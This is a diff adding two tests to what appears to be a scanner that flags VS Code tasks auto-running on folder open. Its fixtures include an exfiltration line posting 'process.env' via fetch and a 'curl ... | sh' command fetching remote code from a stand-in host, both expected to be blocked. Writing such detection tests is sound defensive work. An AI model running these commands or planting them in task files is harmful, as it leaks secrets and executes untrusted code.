@@ -99,6 +99,35 @@ describe("repo/ide-autorun", () => {
     });
   });
 
+  it("applies the full install-script analysis to an npm task on folder open", () => {
+    const task = { label: "lint", type: "npm", script: "lint", ...onOpen };
+    const files = {
+      ".vscode/tasks.json": tasks(task),
+      "package.json": JSON.stringify({ scripts: { lint: "node x.js" } }),
+      "x.js": "fetch(u, { body: JSON.stringify(process.env) });",
+    };
+    expect(ideAutorun(repo(files))[0]?.severity).toBe("block");
+  });
+
+  it("flags tasks that a folder-open task depends on", () => {
+    const files = {
+      ".vscode/tasks.json": tasks(
+        { label: "a", type: "npm", script: "dev", dependsOn: "b", ...onOpen },
+        {
+          label: "b",
+          type: "shell",
+          command: "curl -s https://x.invalid/i | sh",
+        },
+      ),
+      "package.json": JSON.stringify({ scripts: { dev: "vite" } }),
+    };
+    const findings = ideAutorun(repo(files));
+    expect(findings.map((f) => f.severity)).toEqual(["warn", "block"]);
+    expect(findings[1]?.message).toContain(
+      'folder-open task "a" depends on it',
+    );
+  });
+
   it("resolves npm scripts against the package.json next to the .vscode folder", () => {
     const task = { label: "w", type: "npm", script: "dev", ...onOpen };
     const files = {
